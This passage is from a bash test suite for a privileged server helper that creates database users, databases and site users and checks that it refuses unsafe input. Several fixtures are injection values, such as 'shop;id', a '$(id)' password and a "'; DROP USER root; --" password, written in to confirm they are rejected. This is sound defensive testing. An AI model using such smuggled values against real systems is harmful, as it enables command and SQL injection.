  printf 'mariadb=%s\ndb_exists=%s\nuser_exists=%s\nuser_global=%s\nuser_elsewhere=%s\ndb_others=%s\ngranted=%s\n' "${@:1:7}"
  printf 'user_socket=%s\nsocket_plugin=%s\ntcp_user_exists=%s\ntcp_granted=%s\n' "${8:-0}" "${9:-1}" "${10:-0}" "${11:-0}"
}
# Postgres has no mariadb, socket_plugin or tcp_ line.
pg_state() { db_state "$@" | sed '1d;/^socket_plugin=/d;/^tcp_/d'; }
db_state 0 0 0 0 0 0 0 > "$WORK/db-mysql-fresh"
db_state 1 0 0 0 0 0 0 > "$WORK/db-mariadb-fresh"
db_state 0 1 1 0 0 0 1 0 1 1 1 > "$WORK/db-mysql-done"
db_state 0 0 1 0 0 0 0 0 1 1 0 > "$WORK/db-mysql-user"
db_state 0 0 1 0 0 0 1 0 1 1 1 > "$WORK/db-mysql-dropped"
# A 1.0.0 user: on localhost only. Then a user on 127.0.0.1 without its grant, and one there alone.
db_state 0 1 1 0 0 0 1 > "$WORK/db-mysql-localhost-only"
db_state 1 1 1 0 0 0 1 > "$WORK/db-mariadb-localhost-only"
db_state 0 1 1 0 0 0 1 0 1 1 0 > "$WORK/db-mysql-tcp-nogrant"
db_state 0 0 1 0 0 0 0 > "$WORK/db-mysql-user-localhost-nodb"
db_state 0 0 0 0 0 0 0 0 1 1 0 > "$WORK/db-mysql-tcp-only"
db_state 0 1 0 0 0 0 1 > "$WORK/db-mysql-grant-only"
db_state 0 1 1 0 0 1 0 > "$WORK/db-mysql-taken"
db_state 0 1 1 0 0 1 1 > "$WORK/db-mysql-shared"
db_state 0 1 0 0 0 0 0 > "$WORK/db-mysql-nobody"
db_state 0 0 1 1 0 0 0 > "$WORK/db-mysql-global"
db_state 0 0 1 0 1 0 0 > "$WORK/db-mysql-elsewhere"
pg_state 0 1 1 0 0 0 1 > "$WORK/db-pgsql-done"
pg_state 0 1 1 0 0 1 0 > "$WORK/db-pgsql-taken"
printf 'db_exists=0\nuser_exists=0\nPATH=/tmp\n' > "$WORK/db-junk"
printf 'mariadb=0\ndb_exists=0\nuser_exists=0\n' > "$WORK/db-short"

IN=$PW ok "mysql created" "created: mysql database shop for user shop" db-create mysql shop shop password
IN=$PW ok "mysql through the socket as root" "HOME=/root LC_ALL=C mysql --protocol=socket --user=root" db-create mysql shop shop password
IN=$PW ok "mysql with a clean environment" "run: env -i PATH=" db-create mysql shop shop password
IN=$PW ok "mysql statement log off first" "(SQL on stdin)
  SET SESSION sql_log_off = 1;" db-create mysql shop shop socket
IN=$PW ok "mysql user on localhost" "CREATE USER 'shop'@'localhost' IDENTIFIED BY '<password>';" db-create mysql shop shop password
# shellcheck disable=SC2016 # the backticks are literal SQL or a name that must be refused
IN=$PW ok "mysql database utf8mb4" 'CREATE DATABASE `shop_db` CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;' db-create mysql shop_db shop password
# shellcheck disable=SC2016 # the backticks are literal SQL or a name that must be refused
IN=$PW ok "mysql grant on that database only" 'GRANT ALL PRIVILEGES ON `shop\_db`.* TO '"'shop'@'localhost';" db-create mysql shop_db shop password
IN=$PW lacks "mysql no global grant" 'ON *.*' db-create mysql shop_db shop password
IN=$PW ok "mysql checks both grant spellings" "Db IN ('shop_db', 'shop\\\\_db')" db-create mysql shop_db shop password
IN=$PW ok "mariadb client" "LC_ALL=C mariadb --protocol=socket --user=root" db-create mariadb shop shop password
IN=$PW ok "mariadb created" "created: mariadb database shop for user shop" db-create mariadb shop shop password
IN=$PW ok "pgsql as postgres" "runuser -u postgres -- psql -X -q -A -t --no-password -v ON_ERROR_STOP=1 -d postgres" db-create pgsql shop shop password
IN=$PW ok "pgsql statement logs off" "SET log_statement = 'none';
  SET log_min_duration_statement = -1;
  SET log_min_error_statement = 'panic';
  SET pg_stat_statements.track_utility = off;" db-create pgsql shop shop socket
IN=$PW ok "pgsql role without rights" "CREATE ROLE \"shop\" LOGIN NOSUPERUSER NOCREATEDB NOCREATEROLE NOREPLICATION NOBYPASSRLS PASSWORD '<password>';" db-create pgsql shop shop password
IN=$PW ok "pgsql database owned by the user" "CREATE DATABASE \"shop_db\" OWNER \"shop\" ENCODING 'UTF8' TEMPLATE template0;" db-create pgsql shop_db shop password
IN=$PW ok "pgsql closed to others" "REVOKE ALL ON DATABASE \"shop_db\" FROM PUBLIC;" db-create pgsql shop_db shop password
IN=$PW ok "pgsql created" "created: pgsql database shop for user shop" db-create pgsql shop shop password
IN=$PW ok "longest names" "created: mysql database a2345678901234567890123456789012 for user b2345678901234567890123456789012" \
  db-create mysql a2345678901234567890123456789012 b2345678901234567890123456789012 socket
IN="$PW"$'\n' ok "password with a trailing newline" "created:" db-create mysql shop shop password
IN='Az09._~+/=-Az09._~+/=-Az09._~+/=-' ok "password with every allowed sign" "created:" db-create mysql shop shop password
IN=$PW DBSTATE="$WORK/db-mysql-done" ok "already there" "exists: mysql database shop for user shop, nothing changed" db-create mysql shop shop password
IN=$PW DBSTATE="$WORK/db-mysql-done" lacks "already there runs nothing" "run:" db-create mysql shop shop password
IN=$PW DBSTATE="$WORK/db-pgsql-done" ok "pgsql already there" "exists: pgsql database shop for user shop, nothing changed" db-create pgsql shop shop password
IN=$PW DBSTATE="$WORK/db-mysql-user" ok "user existed" "(password login, the user existed, its password is unchanged)" db-create mysql shop shop password
IN=$PW DBSTATE="$WORK/db-mysql-user" lacks "user existed keeps its password" "CREATE USER" db-create mysql shop shop password
# shellcheck disable=SC2016 # the backticks are literal SQL or a name that must be refused
IN=$PW DBSTATE="$WORK/db-mysql-dropped" ok "grant left from a dropped database" 'CREATE DATABASE `shop`' db-create mysql shop shop password
IN=$PW DBSTATE="$WORK/db-mysql-dropped" lacks "grant not given twice" "GRANT ALL" db-create mysql shop shop password
IN=$PW DBSTATE="$WORK/db-mysql-grant-only" ok "user missing for a granted database" "CREATE USER 'shop'@'localhost'" db-create mysql shop shop password
IN=$PW DBSTATE="$WORK/db-mariadb-fresh" ok "mariadb state" "created: mariadb" db-create mariadb shop shop password

echo "== db-create password login on localhost and 127.0.0.1"
IN=$PW ok "mysql user on 127.0.0.1" "CREATE USER 'shop'@'127.0.0.1' IDENTIFIED BY '<password>';" db-create mysql shop shop password
# shellcheck disable=SC2016 # the backticks are literal SQL
IN=$PW ok "mysql grant on 127.0.0.1" 'GRANT ALL PRIVILEGES ON `shop\_db`.* TO '"'shop'@'127.0.0.1';" db-create mysql shop_db shop password
IN=$PW DBSTATE="$WORK/db-mariadb-fresh" ok "mariadb user on 127.0.0.1" "CREATE USER 'shop'@'127.0.0.1' IDENTIFIED BY '<password>';" db-create mariadb shop shop password
IN=$PW DBSTATE="$WORK/db-mariadb-fresh" ok "mariadb grant on 127.0.0.1" "TO 'shop'@'127.0.0.1';" db-create mariadb shop shop password
IN=$PW ok "mysql checks the user on 127.0.0.1" "FROM mysql.user WHERE User = 'shop' AND Host = '127.0.0.1';" db-create mysql shop shop password
IN=$PW ok "mysql: the user's own hosts are not others" "NOT (User = 'shop' AND Host IN ('localhost', '127.0.0.1'))" db-create mysql shop shop password
IN=$PW lacks "pgsql has no host" "127.0.0.1" db-create pgsql shop shop password
IN=$PW DBSTATE="$WORK/db-mysql-localhost-only" ok "1.0.0 user stays on localhost" "exists: mysql database shop for user shop, nothing changed (password login)" db-create mysql shop shop password
IN=$PW DBSTATE="$WORK/db-mariadb-localhost-only" lacks "1.0.0 mariadb user gets no 127.0.0.1 user" "127.0.0.1' IDENTIFIED" db-create mariadb shop shop password
IN=$PW DBSTATE="$WORK/db-mysql-user-localhost-nodb" ok "1.0.0 user, new database: no 127.0.0.1 user" "  SET SESSION sql_log_off = 1;
  CREATE DATABASE \`shop\` CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
  GRANT ALL PRIVILEGES ON \`shop\`.* TO 'shop'@'localhost';
created: mysql database shop for user shop (password login, the user existed on localhost only, its password is unchanged)" db-create mysql shop shop password
IN=$PW DBSTATE="$WORK/db-mysql-tcp-nogrant" ok "127.0.0.1 user without its grant: only the grant" "  SET SESSION sql_log_off = 1;
  GRANT ALL PRIVILEGES ON \`shop\`.* TO 'shop'@'127.0.0.1';
created:" db-create mysql shop shop password
IN=$PW DBSTATE="$WORK/db-mysql-tcp-only" refuse "user on 127.0.0.1 only" "user shop exists on 127.0.0.1 only, refusing" db-create mysql shop shop password

echo "== db-create refusals"
IN=$PW refuse "db no arguments" "usage: db-create <engine> <name> <user> <socket|password>" db-create
IN=$PW refuse "db two arguments" "usage" db-create mysql shop
IN=$PW refuse "db three arguments, no login" "usage" db-create mysql shop shop
refuse "db three arguments, no login, no stdin" "usage" db-create mysql shop shop
IN=$PW refuse "db five arguments" "usage" db-create mysql shop shop password "$PW"
for bad in tcp Socket PASSWORD '' 'socket;id' 'socket ' peer none; do
  IN=$PW refuse "login '$bad'" "invalid login: $bad (socket or password)" db-create mysql shop shop "$bad"
done
IN='' refuse "password login with nothing on stdin" "the password on stdin must be 16 to 128 characters" db-create mysql shop shop password
IN=$'\n' refuse "password login with a lone newline" "16 to 128" db-create pgsql shop shop password
IN=' ' refuse "password login with a space" "16 to 128" db-create mariadb shop shop password
for engine in mysql mariadb pgsql; do
  IN='' call db-create "$engine" shop shop password
  if [[ $OUT != *"run:"* && $OUT != *"socket login"* ]]; then pass; else failure "$engine lost password never falls back to socket login" "$OUT"; fi
done
IN=$PW refuse "unknown engine" "invalid database engine: sqlite" db-create sqlite shop shop password
IN=$PW refuse "engine uppercase" "invalid database engine" db-create MySQL shop shop password
IN=$PW refuse "engine postgres" "invalid database engine" db-create postgres shop shop password
IN=$PW refuse "engine with a command" "invalid database engine" db-create 'mysql;id' shop shop password
# shellcheck disable=SC2016 # the backticks are literal SQL or a name that must be refused
for bad in Shop shop-db shop.db 'shop;id' "shop'x" 'shop`x' 'shop"x' 'shop x' 'shop$x' '1shop' '_shop' '' \
  a23456789012345678901234567890123 $'shop\nid' 'shop%' 'sh\op'; do
  IN=$PW refuse "database name '$bad'" "invalid database name" db-create mysql "$bad" shop password
  IN=$PW refuse "user name '$bad'" "invalid user name" db-create pgsql shop "$bad" password
done
for reserved in mysql information_schema performance_schema sys postgres template0 template1 root pg_shop; do
  IN=$PW refuse "reserved database $reserved" "reserved database name: $reserved" db-create mysql "$reserved" shop password
  IN=$PW refuse "reserved user $reserved" "reserved user name: $reserved" db-create pgsql shop "$reserved" password
done
IN='short-password1' refuse "password too short" "16 to 128" db-create mysql shop shop password
IN=$(printf '%0129d' 0) refuse "password too long" "16 to 128" db-create mysql shop shop password
IN=$(printf '%0300d' 0) refuse "password far too long" "16 to 128" db-create mysql shop shop password
IN="$PW'; DROP USER root; --" refuse "password with a quote" "16 to 128" db-create mysql shop shop password
IN="$PW\\" refuse "password with a backslash" "16 to 128" db-create mysql shop shop password
IN="$PW x" refuse "password with a space" "16 to 128" db-create mysql shop shop password
IN="$PW\$(id)" refuse "password with a command" "16 to 128" db-create mysql shop shop password
IN="$PW"$'\n'"$PW" refuse "password on two lines" "16 to 128" db-create mysql shop shop password
IN=$PW DBSTATE="$WORK/db-mysql-fresh" refuse "mariadb on a MySQL server" "this server runs MySQL, not MariaDB" db-create mariadb shop shop password
IN=$PW DBSTATE="$WORK/db-mariadb-fresh" refuse "mysql on a MariaDB server" "this server runs MariaDB, not MySQL" db-create mysql shop shop password
IN=$PW DBSTATE="$WORK/db-mysql-taken" refuse "database of another user" "database shop belongs to another user" db-create mysql shop shop password
IN=$PW DBSTATE="$WORK/db-mysql-shared" refuse "database shared with another user" "database shop belongs to another user" db-create mysql shop shop password
IN=$PW DBSTATE="$WORK/db-pgsql-taken" refuse "pgsql database of another owner" "database shop belongs to another user" db-create pgsql shop shop password
IN=$PW DBSTATE="$WORK/db-mysql-nobody" refuse "database nobody has" "database shop exists and is not shop's" db-create mysql shop shop password
IN=$PW DBSTATE="$WORK/db-mysql-global" refuse "user with global rights" "user shop has rights beyond one database" db-create mysql shop shop password
IN=$PW DBSTATE="$WORK/db-mysql-elsewhere" refuse "user on another database" "user shop has rights on another database" db-create mysql shop shop password
IN=$PW DBSTATE="$WORK/db-junk" refuse "checks with another line" "cannot read the pgsql checks: PATH=/tmp" db-create pgsql shop shop password
IN=$PW DBSTATE="$WORK/db-short" refuse "checks with a key missing" "cannot read the mysql checks: no user_global" db-create mysql shop shop password

echo "== db-create keeps the password secret"
for engine in mysql mariadb pgsql; do
  IN=$PW lacks "$engine password not in the output" "$PW" db-create "$engine" shop shop password
  IN=$PW DBSTATE="$WORK/db-mysql-taken" call db-create "$engine" shop shop password
  if [[ $OUT != *"$PW"* ]]; then pass; else failure "$engine password not in a refusal" "$OUT"; fi
done
IN=$PW ok "db-create logs engine, name and user" $'log: eeploi-helper: eeploi: db-create pgsql shop_db shop password\n' db-create pgsql shop_db shop password
IN="$PW'x" call db-create mysql shop shop password
if [[ $OUT != *"$PW"* ]]; then pass; else failure "a refused password is not echoed" "$OUT"; fi

echo "== db-create socket login"
S=shop_example
db_state 0 0 0 0 0 0 0 0 0 > "$WORK/db-mysql-noplugin"
db_state 1 0 0 0 0 0 0 0 0 > "$WORK/db-mariadb-noplugin"
db_state 0 1 1 0 0 0 1 1 > "$WORK/db-mysql-socket-done"
db_state 1 1 1 0 0 0 1 1 > "$WORK/db-mariadb-socket-done"
db_state 0 1 1 0 0 0 1 1 0 > "$WORK/db-mysql-socket-done-noplugin"
db_state 0 0 1 0 0 0 0 1 > "$WORK/db-mysql-socket-user"
pg_state 0 1 1 0 0 0 1 1 > "$WORK/db-pgsql-socket-done"
pg_state 0 0 1 0 0 0 0 1 > "$WORK/db-pgsql-socket-user"
pg_state 0 0 1 0 0 0 0 0 > "$WORK/db-pgsql-password-user"
{ echo 'uid=none'; db_state 0 0 0 0 0 0 0; } > "$WORK/db-no-unix-user"
{ echo 'uid=33'; db_state 0 0 0 0 0 0 0; } > "$WORK/db-system-user"
{ echo 'uid=999'; db_state 0 0 0 0 0 0 0; } > "$WORK/db-uid-999"
{ echo 'uid=1000'; db_state 0 0 0 0 0 0 0; } > "$WORK/db-uid-1000"

ok "mysql socket created" "created: mysql database $S for user $S (socket login)" db-create mysql $S $S socket
ok "mysql socket user" "CREATE USER '$S'@'localhost' IDENTIFIED WITH auth_socket;" db-create mysql $S $S socket
# shellcheck disable=SC2016 # the backticks are literal SQL
ok "mysql socket database and grant" '  CREATE DATABASE `shop_example` CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
  GRANT ALL PRIVILEGES ON `shop\_example`.* TO '"'$S'@'localhost';" db-create mysql $S $S socket
ok "mariadb socket user" "CREATE USER '$S'@'localhost' IDENTIFIED VIA unix_socket;" db-create mariadb $S $S socket
ok "mariadb socket created" "created: mariadb database $S for user $S (socket login)" db-create mariadb $S $S socket
ok "pgsql socket role without a password" "  CREATE ROLE \"$S\" LOGIN NOSUPERUSER NOCREATEDB NOCREATEROLE NOREPLICATION NOBYPASSRLS;
  CREATE DATABASE \"$S\" OWNER \"$S\" ENCODING 'UTF8' TEMPLATE template0;
  REVOKE ALL ON DATABASE \"$S\" FROM PUBLIC;" db-create pgsql $S $S socket
ok "pgsql socket created" "created: pgsql database $S for user $S (socket login)" db-create pgsql $S $S socket
IN=$PW ok "socket login ignores stdin" "(socket login)" db-create mysql $S $S socket
IN=$PW lacks "socket login with stdin makes no password" "IDENTIFIED BY" db-create mysql $S $S socket
IN=$PW ok "password created says so" "created: mysql database $S for user $S (password login)" db-create mysql $S $S password
for engine in mysql mariadb pgsql; do
  ok "$engine socket checks the Unix user" "check: id -u -- $S" db-create "$engine" $S $S socket
  for text in PASSWORD 'IDENTIFIED BY' '<password>' 'mysql_native_password' 'caching_sha2_password'; do
    lacks "$engine socket has no $text" "$text" db-create "$engine" $S $S socket
  done
  IN=$PW lacks "$engine password login skips the Unix user" "id -u" db-create "$engine" $S $S password
done
IN=$PW DBSTATE="$WORK/db-no-unix-user" ok "password login needs no Unix user" "created: mysql database $S for user $S (password login)" db-create mysql $S $S password
ok "pgsql socket checks for a password" "FROM pg_authid WHERE rolname = '$S' AND rolpassword IS NULL;" db-create pgsql $S $S socket
ok "mysql socket checks the login method" "AND plugin IN ('auth_socket', 'unix_socket');" db-create mysql $S $S socket
ok "mysql checks the socket plugin" "WHERE PLUGIN_NAME = IF(VERSION() LIKE '%MariaDB%', 'unix_socket', 'auth_socket') AND PLUGIN_STATUS = 'ACTIVE';" db-create mysql $S $S socket
DBSTATE="$WORK/db-uid-1000" ok "uid 1000 is a site user" "(socket login)" db-create mysql $S $S socket

echo "== db-create socket login: the auth_socket plugin"
DBSTATE="$WORK/db-mysql-noplugin" ok "mysql installs auth_socket before the user" "  SET SESSION sql_log_off = 1;
  INSTALL PLUGIN auth_socket SONAME 'auth_socket.so';
  CREATE USER '$S'@'localhost' IDENTIFIED WITH auth_socket;" db-create mysql $S $S socket
lacks "mysql with auth_socket active installs nothing" "INSTALL PLUGIN" db-create mysql $S $S socket
IN=$PW DBSTATE="$WORK/db-mysql-noplugin" lacks "password login needs no plugin" "INSTALL PLUGIN" db-create mysql $S $S password
DBSTATE="$WORK/db-mysql-socket-done-noplugin" ok "socket user there, plugin missing: only the plugin" "  INSTALL PLUGIN auth_socket SONAME 'auth_socket.so';
created:" db-create mysql $S $S socket
DBSTATE="$WORK/db-mysql-socket-done-noplugin" lacks "socket user there, plugin missing: no user" "CREATE USER" db-create mysql $S $S socket
DBSTATE="$WORK/db-mariadb-noplugin" refuse "mariadb without unix_socket" "the unix_socket plugin is not active on this MariaDB server" db-create mariadb $S $S socket
lacks "pgsql has no plugin" "INSTALL" db-create pgsql $S $S socket

echo "== db-create socket login: already there"
DBSTATE="$WORK/db-mysql-socket-done" ok "mysql socket already there" "exists: mysql database $S for user $S, nothing changed (socket login)" db-create mysql $S $S socket
DBSTATE="$WORK/db-mysql-socket-done" lacks "mysql socket already there runs nothing" "run:" db-create mysql $S $S socket
DBSTATE="$WORK/db-mariadb-socket-done" ok "mariadb socket already there" "nothing changed (socket login)" db-create mariadb $S $S socket
DBSTATE="$WORK/db-pgsql-socket-done" ok "pgsql socket already there" "nothing changed (socket login)" db-create pgsql $S $S socket
DBSTATE="$WORK/db-mysql-socket-user" ok "socket user existed" "created: mysql database $S for user $S (socket login, the user existed)" db-create mysql $S $S socket
DBSTATE="$WORK/db-mysql-socket-user" lacks "socket user existed is not created again" "CREATE USER" db-create mysql $S $S socket
DBSTATE="$WORK/db-pgsql-socket-user" lacks "pgsql socket role existed is not created again" "CREATE ROLE" db-create pgsql $S $S socket

echo "== db-create socket login refusals"
DBSTATE="$WORK/db-no-unix-user" refuse "no Unix user" "no Unix user $S on this server" db-create mysql $S $S socket
DBSTATE="$WORK/db-no-unix-user" refuse "pgsql no Unix user" "no Unix user $S on this server" db-create pgsql $S $S socket
DBSTATE="$WORK/db-no-unix-user" refuse "mariadb no Unix user" "no Unix user $S on this server" db-create mariadb $S $S socket
DBSTATE="$WORK/db-no-unix-user" call db-create mysql $S $S socket
if [[ $OUT != *"run:"* && $OUT != *"check: what"* ]]; then pass; else failure "no Unix user: the database is not asked" "$OUT"; fi
DBSTATE="$WORK/db-system-user" refuse "system user" "$S is a system user (uid 33)" db-create mysql $S $S socket
DBSTATE="$WORK/db-uid-999" refuse "uid 999" "is a system user (uid 999)" db-create pgsql $S $S socket
for shared in eeploi ploi forge; do
  refuse "socket login for $shared" "$shared runs more than one site" db-create mysql "$shared" "$shared" socket
done
AS=deploy ETC_DIR="$WORK/etc-conf" refuse "socket login for the deploy user" "deploy runs more than one site" db-create pgsql deploy deploy socket
DBSTATE="$WORK/db-mysql-user" refuse "mysql password user, socket asked" "user shop exists with password login, not socket login: refusing, it is not switched" db-create mysql shop shop socket
db_state 1 0 1 0 0 0 0 > "$WORK/db-mariadb-user"
DBSTATE="$WORK/db-mariadb-user" refuse "mariadb password user, socket asked" "exists with password login" db-create mariadb shop shop socket
DBSTATE="$WORK/db-pgsql-password-user" refuse "pgsql role with a password, socket asked" "user shop exists with password login" db-create pgsql shop shop socket
IN=$PW DBSTATE="$WORK/db-mysql-socket-user" refuse "mysql socket user, password asked" "user $S exists with socket login, not password login: refusing, it is not switched" db-create mysql $S $S password
IN=$PW DBSTATE="$WORK/db-pgsql-socket-user" refuse "pgsql role without a password, password asked" "exists with socket login" db-create pgsql $S $S password
IN=$PW DBSTATE="$WORK/db-mysql-socket-done" refuse "socket done, password asked" "exists with socket login" db-create mysql $S $S password
db_state 0 1 1 0 0 0 1 1 1 1 1 > "$WORK/db-mysql-socket-and-tcp"
DBSTATE="$WORK/db-mysql-socket-and-tcp" refuse "socket asked, a user on 127.0.0.1" "user shop exists on 127.0.0.1 with password login, not socket login" db-create mysql shop shop socket
DBSTATE="$WORK/db-mysql-tcp-only" refuse "socket asked, a user on 127.0.0.1 only" "exists on 127.0.0.1 with password login" db-create mysql shop shop socket
lacks "socket login has no 127.0.0.1 user" "'@'127.0.0.1' IDENTIFIED" db-create mysql $S $S socket
DBSTATE="$WORK/db-mysql-taken" refuse "socket: database of another user" "database shop belongs to another user" db-create mysql shop shop socket
DBSTATE="$WORK/db-mysql-shared" refuse "socket: database shared" "database shop belongs to another user" db-create mysql shop shop socket
DBSTATE="$WORK/db-pgsql-taken" refuse "socket: pgsql database of another owner" "belongs to another user" db-create pgsql shop shop socket
DBSTATE="$WORK/db-mysql-nobody" refuse "socket: database nobody has" "exists and is not shop's" db-create mysql shop shop socket
DBSTATE="$WORK/db-mysql-global" refuse "socket: user with global rights" "rights beyond one database" db-create mysql shop shop socket
DBSTATE="$WORK/db-mysql-elsewhere" refuse "socket: user on another database" "rights on another database" db-create mysql shop shop socket
DBSTATE="$WORK/db-mysql-fresh" refuse "socket: mariadb on MySQL" "this server runs MySQL, not MariaDB" db-create mariadb shop shop socket
DBSTATE="$WORK/db-mariadb-fresh" refuse "socket: mysql on MariaDB" "this server runs MariaDB, not MySQL" db-create mysql shop shop socket
refuse "socket: hyphen in the name" "invalid user name: shop-example" db-create mysql shop_example shop-example socket
refuse "socket: reserved mysql" "reserved user name: mysql" db-create mysql shop mysql socket
refuse "socket: reserved postgres" "reserved user name: postgres" db-create pgsql shop postgres socket
ok "socket login logs engine, name, user and login" $'log: eeploi-helper: eeploi: db-create mysql shop_example shop_example socket\n' db-create mysql $S $S socket

echo "== db-create stdin: an open pipe and a terminal"
# The dry-run environment for timeout and script: the default fixtures, as call uses them.
HELPER_ENV=(EEPLOI_HELPER_DRY_RUN=1 SUDO_USER=eeploi EEPLOI_HELPER_ETC="$WORK/etc-sites"
  EEPLOI_HELPER_NGINX_CONF="$WORK/nginx-default.conf" EEPLOI_HELPER_SYSTEM="$WORK/system")
# helper_cmd <args...>: the dry-run helper as a command line, for timeout and script.
helper_cmd() { printf '%q ' env -i PATH="$PATH" "${HELPER_ENV[@]}" bash "$HELPER" "$@"; }
if command -v timeout > /dev/null; then
  # A pipe that is open but never written or closed: socket login must not read it, so it ends.
  mkfifo "$WORK/open-pipe"
  exec 3<> "$WORK/open-pipe"
  OUT=$(timeout 10 env -i PATH="$PATH" "${HELPER_ENV[@]}" bash "$HELPER" db-create mysql $S $S socket <&3 2>&1)
  CODE=$?
  if [ "$CODE" -eq 0 ] && [[ $OUT == *"(socket login)"* ]]; then pass; else failure "socket login does not read an open pipe" "exit $CODE
$OUT"; fi
  exec 3>&-
else
  echo "note: timeout is not installed, open-pipe test skipped (CI runs it)"
fi
# tty_call <args...>: run the helper with a terminal on stdin, through script (util-linux or BSD).
tty_call() {
  if script --version 2> /dev/null | grep -q util-linux; then
    OUT=$(timeout 10 script -qec "$(helper_cmd "$@")" /dev/null < /dev/null 2>&1)
  else
    OUT=$(timeout 10 script -q /dev/null env -i PATH="$PATH" "${HELPER_ENV[@]}" bash "$HELPER" "$@" < /dev/null 2>&1)
  fi
  CODE=$?
}
if command -v script > /dev/null && command -v timeout > /dev/null; then
  tty_call db-create mysql shop shop password
  if [ "$CODE" -eq 64 ] && [[ $OUT == *"password login needs the password on stdin, not a terminal"* ]]; then pass; else failure "password login refuses a terminal" "exit $CODE
$OUT"; fi
  tty_call db-create mysql $S $S socket
  if [ "$CODE" -eq 0 ] && [[ $OUT == *"(socket login)"* ]]; then pass; else failure "socket login with a terminal" "exit $CODE
$OUT"; fi
  tty_call run-as shop_example
  if [ "$CODE" -eq 64 ] && [[ $OUT == *"run-as needs the script on stdin, not a terminal"* ]]; then pass; else failure "run-as refuses a terminal" "exit $CODE
$OUT"; fi
else
  echo "note: script or timeout is not installed, terminal tests skipped (CI runs them)"
fi

echo "== site users: the check every site subcommand trusts"
# run-as shows site_user best: it does nothing else before runuser.
ok "a listed site user" "run: runuser -u shop_example" run-as shop_example
ok "a registry with a comment and an empty line" "run: runuser -u shop" run-as shop
for reserved in root eeploi ubuntu ploi forge postgres mysql redis nobody; do
  refuse "run-as $reserved" "reserved name, not a site user: $reserved" run-as "$reserved"
done
# www-data has a hyphen, so the name check already refuses it.
refuse "run-as www-data" "invalid site user: www-data" run-as www-data
AS=deploy ETC_DIR="$WORK/etc-conf" refuse "run-as the deploy user" "reserved name, not a site user: deploy" run-as deploy
NGINX="$WORK/nginx-group.conf" refuse "run-as the nginx user" "reserved name, not a site user: nginx" run-as nginx
for bad in Shop shop-example shop.example '1shop' '_shop' '' a23456789012345678901234567890123 'shop;id' $'shop\nid' '../shop'; do
  refuse "site user name '$bad'" "invalid site user" run-as "$bad"
done
refuse "an unlisted user" "alex is not an eeploi site user (not in $WORK/etc-sites/sites)" run-as alex
refuse "a listed user in sudo" "shop_sudo is in other groups too (ids 1004 27), not a site user" run-as shop_sudo
refuse "a uid below 1000" "shop_low is a system user (uid 999), not a site user" run-as shop_low
refuse "a home outside /srv/eeploi" "shop_away has home /home/shop_away, not /srv/eeploi/shop_away" run-as shop_away
refuse "a primary group not its own" "the group of shop_group is not its own group shop_group" run-as shop_group
refuse "listed, but no Linux user" "no Linux user shop_half on this server" run-as shop_half
SYS='' refuse "no Linux user at all" "no Linux user shop_example on this server" run-as shop_example
ETC_DIR="$WORK/etc-reg-writable" refuse "registry writable by others" "untrusted site registry" run-as shop_example
ETC_DIR="$WORK/etc-reg-link" refuse "registry as a link" "untrusted site registry" run-as shop_example
ETC_DIR="$WORK/etc-reg-folder" refuse "registry folder writable by others" "untrusted site registry" run-as shop_example
ETC_DIR="$WORK/etc-reg-badline" refuse "registry with another line" "invalid line in" run-as shop_example
ETC_DIR="$WORK/etc-reg-inject" refuse "registry with a command" "invalid line in" run-as shop_example
ETC_DIR="$WORK/etc-reg-twice" refuse "registry with DOMAIN twice" "DOMAIN is set twice" run-as shop_example
ETC_DIR="$WORK/etc-reg-nodomain" refuse "registry without DOMAIN" "no DOMAIN in" run-as shop_example
ETC_DIR="$WORK/etc-reg-baddomain" refuse "registry with a bad DOMAIN" "invalid domain: shop" run-as shop_example

echo "== site-user-create"
ok "the registry first" "  DOMAIN=new.example
  HOME=/srv/eeploi/shop_new
write: $WORK/etc-sites/sites/shop_new (644)" "${NEW[@]}"
ok "useradd" "run: useradd --home-dir /srv/eeploi/shop_new --create-home --user-group --shell /usr/sbin/nologin shop_new" "${NEW[@]}"
ok "then checks the new user" "check: site user shop_new (uid 1000 or higher, home /srv/eeploi/shop_new, only its own group)" "${NEW[@]}"
ok "home 750, then the ACL" "run: chmod 750 /srv/eeploi/shop_new
run: setfacl -m u:www-data:x /srv/eeploi/shop_new" "${NEW[@]}"
ok "created" "created: site user shop_new for new.example, home /srv/eeploi/shop_new" "${NEW[@]}"
lacks "/srv/eeploi kept when there" "install -d -o root -g root -m 755 /srv/eeploi" "${NEW[@]}"
grep -v '^path /srv/eeploi$' "$WORK/system" > "$WORK/system-no-srv"
SYS="$WORK/system-no-srv" ok "/srv/eeploi made when missing" "run: install -d -o root -g root -m 755 /srv/eeploi
run: useradd" "${NEW[@]}"
ETC_DIR="$WORK/etc-empty" ok "the registry folder made when missing" "run: install -d -o root -g root -m 755 $WORK/etc-empty/sites" "${NEW[@]}"
for text in 'chown' 'chmod -R' 'setfacl -R' '/srv/eeploi/shop_new/'; do
  lacks "root touches only the home itself: no $text" "$text" "${NEW[@]}"
done
ok "a second call changes nothing" "exists: site user shop_example for shop.example, nothing changed" site-user-create shop_example shop.example
ok "a second call sets the home again" "run: chmod 750 /srv/eeploi/shop_example
run: setfacl -m u:www-data:x /srv/eeploi/shop_example" site-user-create shop_example shop.example
lacks "a second call makes no user" "useradd" site-user-create shop_example shop.example
lacks "a second call writes no registry" "write:" site-user-create shop_example shop.example
ok "a half-made site user gets its user" "run: useradd --home-dir /srv/eeploi/shop_half" site-user-create shop_half half.example
lacks "a half-made site user keeps its registry" "write:" site-user-create shop_half half.example
refuse "a second call for a site user in sudo" "in other groups too" site-user-create shop_sudo sudo.example
refuse "an existing user that isn't listed" "alex exists (a user, group or /srv/eeploi/alex) and is not an eeploi site user" site-user-create alex alex.example
refuse "an existing group that isn't listed" "shop_staff exists (a user, group or /srv/eeploi/shop_staff) and is not an eeploi site user" site-user-create shop_staff staff.example
refuse "an existing home that isn't listed" "shop_left exists (a user, group or /srv/eeploi/shop_left) and is not an eeploi site user" site-user-create shop_left left.example
call site-user-create alex alex.example
if [ "$CODE" -eq 64 ] && [[ $OUT != *"write:"* && $OUT != *"run:"* ]]; then pass; else failure "nothing written or run for an existing user" "exit $CODE
$OUT"; fi
refuse "a domain listed for another user" "shop.example is listed for site user shop_example" site-user-create shop_new shop.example
refuse "a listed user for another domain" "site user shop_example is for shop.example, not new.example" site-user-create shop_example new.example
for reserved in root eeploi ubuntu ploi forge postgres mysql redis nobody; do
  refuse "site-user-create $reserved" "reserved name, not a site user: $reserved" site-user-create "$reserved" new.example
